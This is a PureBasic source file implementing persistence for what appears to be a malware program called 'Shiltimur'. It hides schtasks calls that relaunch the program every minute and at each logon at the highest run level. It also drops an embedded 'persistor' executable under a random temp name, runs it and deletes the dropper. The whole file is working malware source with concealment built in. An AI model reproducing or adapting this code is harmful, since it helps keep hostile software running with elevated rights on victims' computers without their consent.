;include file for persistence
XIncludeFile "configreader.pbi"
XIncludeFile "randomgen.pbi"

EnableExplicit

Prototype GetModuleFileNameEx(hProcess.i,hModule.i,lpFilename.i,nSize.i)
Global GetModuleFileNameEx_.GetModuleFileNameEx=GetFunction(OpenLibrary(#PB_Any,"psapi.dll"),"GetModuleFileNameExW")

Declare.i IsPersistorRunning(persistorPath.s)

Procedure TaskPersistence()
  Define retval.i,startupTaskname.s,persistTaskname.s,appPath.s
  startupTaskname=getStartupTaskName()
  persistTaskname=getPersistTaskName()
  appPath=GetSelfPath()
  retval=ShellExecute_(0,"open","schtasks",~"/create /tn \""+persistTaskname+~"\" /sc MINUTE /mo 1 /tr \""+appPath+~" /task\" /rl HIGHEST /f",0,#SW_HIDE) ;create a task (and replace if exists) that repeats every minute at the HIGHEST run level(as admin)
  retval=ShellExecute_(0,"open","schtasks",~"/create /tn \""+startupTaskname+~"\" /sc ONLOGON /tr \""+appPath+~" /task\" /rl HIGHEST /f",0,#SW_HIDE)      ;create a task (and replace if exists) that runs on user logon at the HIGHEST run level(as admin)
EndProcedure

Procedure RealtimePersistence()
  Define persistorsize.q
  Define persistorFullPath.s
  Define randomFullPath.s
  
  persistorFullPath=getPersistorPath()+"\"+getPersistorExeName()+".exe"
  randomFullPath=GetEnvironmentVariable("tmp")+"\"+GetRandomString(10)+".exe"
  
  If Not IsPersistorRunning(persistorFullPath)  
    persistorsize=?endmarker-?persistor
    DeleteFile(persistorFullPath,#PB_FileSystem_Force)
    If OpenFile(0,randomFullPath,#PB_File_SharedWrite)
      WriteData(0,?persistor,persistorsize)
      CloseFile(0)
      RunProgram(randomFullPath,#DQUOTE$+ProgramFilename()+#DQUOTE$+" "+#DQUOTE$+persistorFullPath+#DQUOTE$,"") ;pass our full path as the first commandline parameter and the designated install location for the persistor as the second commandline parameter  
      Delay(500) ;let the persistor install into the right directory
      DeleteFile(randomFullPath)
    EndIf
    
  EndIf
  
EndProcedure


Procedure DoPersistence()
  TaskPersistence()
  RealtimePersistence()
EndProcedure

Procedure.i IsPersistorRunning(persistorPath.s)
  Define persistorHwnd.i, retval.i, pid.i, hProcess.i, pathBuffer.s
  pathBuffer=Space(512)
  persistorHwnd=FindWindow_(0,"Shiltimur Persistor Window Title")
  If persistorHwnd
    GetWindowThreadProcessId_(persistorHwnd,@pid)
    hProcess=OpenProcess_(#PROCESS_QUERY_INFORMATION | #PROCESS_VM_READ,#False,pid)
    If hProcess
      If GetModuleFileNameEx_(hProcess,0,@pathBuffer,512)
        If LCase(persistorPath)=LCase(pathBuffer)
          retval=#True  
        EndIf
      EndIf
      CloseHandle_(hProcess)
    EndIf
  Else
    retval=#False
  EndIf
  ProcedureReturn retval
EndProcedure

DataSection
  persistor:
  IncludeBinary "persistor.exe"
  endmarker:
EndDataSection

; IDE Options = PureBasic 5.70 LTS (Windows - x64)
; CursorPosition = 35
; FirstLine = 18
; Folding = -
; EnableAsm
; EnableThread
; EnableXP
; EnablePurifier